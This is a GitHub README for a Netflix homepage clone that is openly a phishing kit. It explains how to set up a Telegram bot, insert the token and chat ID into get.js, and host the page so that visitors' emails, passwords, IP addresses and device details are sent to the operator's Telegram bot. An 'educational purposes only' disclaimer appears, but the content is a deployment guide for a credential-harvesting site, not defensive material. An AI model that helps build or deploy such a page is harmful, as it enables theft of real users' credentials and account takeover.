# 🎥 Netflix Clone Phishing (Educational Purposes Only) 🚨

Welcome to the **Netflix Clone Phishing** repository! This project is a front-end clone of the Netflix homepage, designed to mimic the look and feel of the original Netflix website. It includes a feature where user interactions (such as email, password, and other details) are logged and sent to a Telegram bot for monitoring. 🕵️‍♂️

**⚠️ Disclaimer:** This project is **strictly for educational purposes only**. It is intended to demonstrate how phishing attacks work and how user data can be captured. I am **not responsible** for any misuse of this code or the data collected. Always ensure you have proper consent and follow legal guidelines when handling user data. Use this responsibly and ethically. 🛑

---

## 🚀 Getting Started

To get started with this project, follow the steps below:

### 📋 Prerequisites

- A **Telegram bot token**. You can create one by talking to [BotFather](https://core.telegram.org/bots#botfather) on Telegram. 🤖
- A web server to host the project (e.g., GitHub Pages, Netlify, Vercel, or any static hosting service). 🌐

---

## 🛠️ Installation

1. **Clone the repository:**

   ```bash
   git clone https://github.com/your-username/netflix-clone-phishing.git
   cd netflix-phishing
   ```

2. **Set up your Telegram bot:**

   - Create a new bot on Telegram using **BotFather**. 🧙‍♂️
   - Note down the bot token provided by BotFather. 🔑

3. **Configure the project:**

   - Open the `get.js` file in your code editor. 📂
   - Replace the placeholder values with your actual information:

     ```javascript
     const TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
     const CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID';
     ```

   - Replace `YOUR_TELEGRAM_BOT_TOKEN` with the token you received from BotFather. 🔑
   - Replace `YOUR_TELEGRAM_CHAT_ID` with your Telegram chat ID. You can get this by sending a message to your bot and then visiting `https://api.telegram.org/bot<YourBotToken>/getUpdates` to see the chat ID. 💬

4. **Host the project:**

   - Upload the project to your preferred static hosting service (e.g., GitHub Pages, Netlify, Vercel, etc.). 🚀
   - Ensure the `get.js` file is accessible and properly linked in your HTML file. 🔗

---

## 🧠 How It Works

- When a user visits the Netflix clone page and interacts with it (e.g., enters email and password), the following information is captured and sent to your Telegram bot: 📩
  - **Email** 📧
  - **Password** 🔒
  - **IP Address** 🌐
  - **Device Type** 📱💻
  - **Platform** 🖥️
  - **User Agent** 🕵️‍♂️
  - **Screen Resolution** 📏
 ![Telegram Bot Infos !](<>)
- This information is sent to your Telegram bot, allowing you to monitor user interactions in real-time. 📲

---

## 🎨 Customization

- **Styling:** You can customize the styling by editing the CSS files in the project. 🎨
- **Content:** Modify the HTML files to change the content displayed on the page. 📄
- **Telegram Bot:** You can enhance the bot's functionality by modifying the `get.js` file to include more detailed information or to perform additional actions based on user interactions. 🤹‍♂️

---

## ⚠️ Important Note

This project is **for educational purposes only**. It is designed to demonstrate how phishing attacks work and how user data can be captured. I am **not responsible** for any misuse of this code or the data collected. Always ensure you have proper consent and follow legal guidelines when handling user data. 🛑

---

## 🤝 Contributing

Contributions are welcome! If you'd like to contribute, feel free to **open a pull request**.  
---

## 📜 License

This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details. 📄

---

## 🙏 Acknowledgments

- **Netflix** for the design inspiration. 🎬
- **Telegram** for providing the bot API. 🤖

---
## 📬 Contact  
For questions or feedback, reach out:  
📸 Instagram: **[rida_unn](https://www.instagram.com/rida_unn)**  

